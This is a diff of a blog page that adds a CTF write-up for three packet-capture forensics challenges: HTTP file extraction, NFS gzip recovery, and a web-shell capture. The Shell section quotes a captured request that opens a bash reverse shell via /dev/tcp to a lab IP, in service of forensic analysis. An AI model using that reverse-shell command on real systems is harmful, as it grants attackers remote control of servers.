@@ -6,21 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://purewhitywhite.github.io">
-  <title>categories | pur3wh1tywhite</title>
+  <title>Stage1Day8 Misc | pur3wh1tywhite</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="pur3wh1tywhite&apos;s blog">
-<meta name="keywords" content="a blog based on Hexo">
-<meta property="og:type" content="website">
-<meta property="og:title" content="categories">
-<meta property="og:url" content="https://purewhitywhite.github.io/categories/index.html">
+  <meta name="description" content="Blue-whale OJForensics1、Forensics2、Shell writeup.">
+<meta name="keywords" content="blue-whale,Misc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Stage1Day8 Misc">
+<meta property="og:url" content="https://purewhitywhite.github.io/2020-03-15/Stage1Day8-Misc/index.html">
 <meta property="og:site_name" content="pur3wh1tywhite">
-<meta property="og:description" content="pur3wh1tywhite&apos;s blog">
+<meta property="og:description" content="Blue-whale OJForensics1、Forensics2、Shell writeup.">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-01-20T08:58:33.114Z">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/15/88hx4H.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/15/884TIg.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-796db5ba77a921c6e143553d47cdc251_720w.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/15/880NIf.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/15/88BjA0.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/15/88DRv4.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/15/886bTA.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/15/88Rs91.md.jpg">
+<meta property="og:updated_time" content="2020-03-15T15:37:22.493Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="categories">
-<meta name="twitter:description" content="pur3wh1tywhite&apos;s blog">
+<meta name="twitter:title" content="Stage1Day8 Misc">
+<meta name="twitter:description" content="Blue-whale OJForensics1、Forensics2、Shell writeup.">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/03/15/88hx4H.jpg">
   
   
     <link rel="icon" href="/img/myicon.ico">
@@ -155,14 +164,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="page-" class="article article-type-page " itemscope itemprop="blogPost">
+            <article id="post-Stage1Day8-Misc" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      categories
+      Stage1Day8 Misc
     </h1>
   
 
@@ -172,7 +181,7 @@
       <span class="post-meta-item-icon" style="color:	#636363;font-size:14px;">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">0字</span>
+        <span class="post-count">470字</span>
       </span>
     </span>
 
@@ -199,8 +208,8 @@
 
 <!--显示阅读次数完毕-->
         
-        <a href="/categories/index.html" class="archive-article-date">
-  	<time datetime="2020-01-20T08:43:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-20</time>
+        <a href="/2020-03-15/Stage1Day8-Misc/" class="archive-article-date">
+  	<time datetime="2020-03-15T12:52:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-15</time>
 </a>
         
       </header>
@@ -209,13 +218,48 @@
 	
 	
       
-        
+        <p>Blue-whale OJ<br>Forensics1、Forensics2、Shell writeup.</p>
+<a id="more"></a>
+<h1 id="Forensics1"><a href="#Forensics1" class="headerlink" title="Forensics1"></a>Forensics1</h1><p>根据提示过滤http流量：<br><center><img src="https://s1.ax1x.com/2020/03/15/88hx4H.jpg" alt="88hx4H.jpg" border="0"></center><br>跟踪http流，可知请求与返回的大概流程：<code>打开网页→获取ico→三次输入密码→进入secretpage→获取s3cret.png</code><br>于是将s3cret.png导出分组字节流→修改后缀名为图片格式→获得flag<br><center><img src="https://s1.ax1x.com/2020/03/15/884TIg.jpg" alt="884TIg.jpg" border="0"></center></p>
+<h1 id="Forensics2"><a href="#Forensics2" class="headerlink" title="Forensics2"></a>Forensics2</h1><h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><ul>
+<li><p><code>NFS</code>实现了一个跨越网络的文件访问功能，其整个架构为Client-Server架构，客户端和服务端通过<code>RPC</code>协议进行通信，<code>RPC</code>协议可以简单的理解为一个基于TCP的应用层协议，它简化命令和数据的传输。</p>
+<center><img src="https://pic2.zhimg.com/80/v2-796db5ba77a921c6e143553d47cdc251_720w.jpg"></center>
+</li>
+<li><p><code>Mount</code>: 从客户端的角度来说，NFS中的第一个操作称为 mount，Mount 代表将远程文件系统加载到本地文件系统空间中。</p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>根据题目的hint，优先考虑与文件相关的<code>NFS</code>协议。过滤NFS流量，一番观察后可以看到flag.txt.gz：</p>
+<center><img src="https://s1.ax1x.com/2020/03/15/880NIf.jpg" alt="880NIf.jpg" border="0"></center>
+继续向下看，双方大概进行了一番认证和目录的搜索，然后就到了用户向服务器写入数据的部分了：
+<center><img src="https://s1.ax1x.com/2020/03/15/88BjA0.jpg" alt="88BjA0.jpg" border="0"></center>
+
+</li>
+</ul>
+<p>查看数据包的详细内容，注意到<code>contents</code>部分很有可能含有flag（不过是乱码）：<br><center><a href="https://imgchr.com/i/88DRv4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/15/88DRv4.jpg" alt="88DRv4.jpg" border="0"></a></center><br>注意到这是个压缩文件，于是将其以压缩文件的形式解码，得到flag：<br><img src="https://s1.ax1x.com/2020/03/15/886bTA.jpg" alt="886bTA.jpg" border="0"></p>
+<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><p>先看http流量，url为<code>http://192.168.247.130/shell.php?cmd=bash -c &#39;bash -i &gt; /dev/tcp/192.168.247.128/12345 &lt;&amp;1 2&gt;&amp;1&#39;]</code><br>貌似是建立了一个<a href="https://www.cnblogs.com/bmjoker/p/9035217.html" title="反弹shell" target="_blank" rel="noopener">反弹shell</a>，跟踪tcp流量就可看到行为：<br><center><img src="https://s1.ax1x.com/2020/03/15/88Rs91.md.jpg" alt="88Rs91.jpg" border="0"></center></p>
+<p>对于<code>www-data@UbuntuServer16:/tmp/flag$ cat flag.txt | base64 -w 0 | python -c &quot;print raw_input().swapcase()&quot;</code>，再结合下面返回的<code>zMXHz3TYzxzLCNnLx3nOzwWXBdfSBgWXBh0k</code>，说明这就是flag里的内容，不过经过base64编码后再<code>swapcase</code>大小写互换，那么写脚本再改变大小写之后base64解码可得到flag：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">code = <span class="string">"zMXHz3TYzxzLCNnLx3nOzwWXBdfSBgWXBh0k"</span></span><br><span class="line">flag = base64.b64decode(code.swapcase())</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+
       
       
     </div>
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">blue-whale</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Misc</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -227,6 +271,16 @@
 </article>
 
   
+<nav id="article-nav">
+  
+  
+    <a href="/2020-03-14/Stage1Day7-pwn/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Stage1Day7 pwn</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -248,7 +302,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    目录，不存在的…
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics1"><span class="toc-number">1.</span> <span class="toc-text">Forensics1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics2"><span class="toc-number">2.</span> <span class="toc-text">Forensics2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#知识补充"><span class="toc-number">2.1.</span> <span class="toc-text">知识补充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题解"><span class="toc-number">2.2.</span> <span class="toc-text">题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shell"><span class="toc-number">3.</span> <span class="toc-text">Shell</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -274,7 +328,7 @@ if(true){
   	repo: 'blog_comment',
   	owner: 'purewhitywhite',
   	admin: ['purewhitywhite'],
-  	id: 'Mon Jan 20 2020 16:43:22 GMT+0800',
+  	id: 'Sun Mar 15 2020 20:52:46 GMT+0800',
   	distractionFreeMode: 'true'
 })
 gitalk.render('gitalk-container') 
@@ -317,7 +371,7 @@ gitalk.render('gitalk-container')
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
